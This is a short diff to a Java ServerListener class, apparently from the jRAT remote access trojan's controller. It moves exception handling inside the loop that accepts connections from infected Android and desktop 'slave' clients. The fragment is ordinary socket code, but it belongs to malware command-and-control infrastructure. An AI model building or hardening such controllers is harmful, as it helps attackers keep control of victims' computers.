@@ -11,7 +11,6 @@ import se.jrat.client.settings.Sockets;
 import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.common.ConnectionCodes;
 
-
 public class ServerListener extends PortListener implements Runnable {
 
 	public ServerListener(String name, int port, int timeout, String pass) throws Exception {
@@ -20,20 +19,21 @@ public class ServerListener extends PortListener implements Runnable {
 
 	@Override
 	public void run() {
-		try {
-			while (!server.isClosed()) {
+		while (!server.isClosed()) {
+			try {
+
 				Socket socket = server.accept();
-				
+
 				int type = socket.getInputStream().read();
-				
+
 				AbstractSlave slave;
-				
+
 				if (type == ConnectionCodes.ANDROID_SLAVE) {
 					slave = new AndroidSlave(this, socket);
 				} else if (type == ConnectionCodes.DESKTOP_SLAVE) {
 					slave = new Slave(this, socket);
 				}
-								
+
 				if (type < 0 || type > 1) {
 					slave = new Slave(this, socket);
 					PanelMainLog.getInstance().addEntry("Error", slave, "Invalid connection type");
@@ -46,9 +46,9 @@ public class ServerListener extends PortListener implements Runnable {
 					PanelMainLog.getInstance().addEntry("Warning", slave, "Maximum of 5 connections reached");
 					continue;
 				}
+			} catch (Exception ex) {
+				ex.printStackTrace();
 			}
-		} catch (Exception ex) {
-			ex.printStackTrace();
 		}
 	}
 
